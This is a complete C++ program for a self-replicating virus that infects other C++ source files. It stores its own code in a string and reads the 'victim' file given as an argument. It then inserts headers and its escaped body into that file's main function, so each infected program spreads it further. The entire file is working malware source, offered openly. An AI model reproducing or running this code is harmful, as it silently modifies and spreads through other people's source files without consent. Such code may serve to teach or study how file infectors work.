#include <iostream>
#include <fstream>
#include <vector>
using namespace std;

int main(int argc, char** argv) {
    string virusBody =
            "\n#include <iostream>\n#include <fstream>\n#include <vector>"
            "\n"
            "       string virusBody = $$\n"
            "    string virus;\n"
            "    vector<string> vVirus;\n"
            "\n"
            "    //Read Victim file and stock the data in a vector\n"
            "    ifstream myfileIn;\n"
            "    myfileIn.open(argv[1]);\n"
            "    while (std::getline(myfileIn, virus)) {\n"
            "        vVirus.push_back(virus);\n"
            "    }\n"
            "    myfileIn.close();\n"
            "\n"
            "    //Add Virus to victim file\n"
            "    std::ofstream myfileOut(argv[1]);\n"
            "    if (myfileOut.is_open()) {\n"
            "        for (int i = 0; i < vVirus.size(); i++) {\n"
            "            if (i == 0) {\n"
            "                myfileOut << virusBody.substr(0, 61) << endl;\n"
            "\n"
            "            } else if (vVirus[i] == \"int main(int argc, char** argv) {\") {\n"
            "                myfileOut << vVirus[i] << endl;\n"
            "                for (int k=61; k<virusBody.size(); k++) {\n"
            "                    if (virusBody[k] == '$' && virusBody[k + 1] == '$') {\n"
            "                        myfileOut << \"\\\"\";\n"
            "                        for (int j = 0; virusBody[j]; j++) {\n"
            "                            if (virusBody[j] == '\\\\') myfileOut << \"\\\\\\\\\";\n"
            "                            else if (virusBody[j] == '\"') myfileOut << \"\\\\\\\"\";\n"
            "                            else if (virusBody[j] == '\\n') myfileOut << (\"\\\\n\");\n"
            "                            else myfileOut << virusBody[j];\n"
            "                        }\n"
            "                        myfileOut << \"\\\";\";\n"
            "                        k++;\n"
            "                    } else\n"
            "                        myfileOut << virusBody[k];\n"
            "                }\n"
            "\n"
            "            } else {\n"
            "                myfileOut << vVirus[i] << endl;\n"
            "            }\n"
            "        }\n"
            "    }\n"
            "    myfileOut.close();\n\n";

    string virus;
    vector<string> vVirus;

    //Read Victim file and stock the data in a vector
    ifstream myfileIn;
    myfileIn.open(argv[1]);
    while (std::getline(myfileIn, virus)) {
        vVirus.push_back(virus);
    }
    myfileIn.close();

    //Add Virus to victim file
    std::ofstream myfileOut(argv[1]);
    if (myfileOut.is_open()) {
        for (int i = 0; i < vVirus.size(); i++) {               //Read each line of the victim file
            if (i == 0) {                                       //Add the libraries to the beginning of the program
                myfileOut << virusBody.substr(0,61) << endl;

            } else if (vVirus[i] == "int main(int argc, char** argv) {") {  //Insert the virus in the main body
                myfileOut << vVirus[i] << endl;
                for (int k=61; k<virusBody.size(); k++) {
                    if (virusBody[k] == '$' && virusBody[k + 1] == '$') {
                        myfileOut << "\"";
                        for (int j = 0; virusBody[j]; j++) {
                            if (virusBody[j] == '\\') myfileOut << "\\\\";
                            else if (virusBody[j] == '"') myfileOut << "\\\"";
                            else if (virusBody[j] == '\n') myfileOut << ("\\n");
                            else myfileOut << virusBody[j];
                        }
                        myfileOut << "\";";
                        k++;
                    } else
                        myfileOut << virusBody[k];
                }

            } else {                                            //Insert remaining line of code
                myfileOut << vVirus[i] << endl;
            }
        }
    }
    myfileOut.close();
    return 0;
}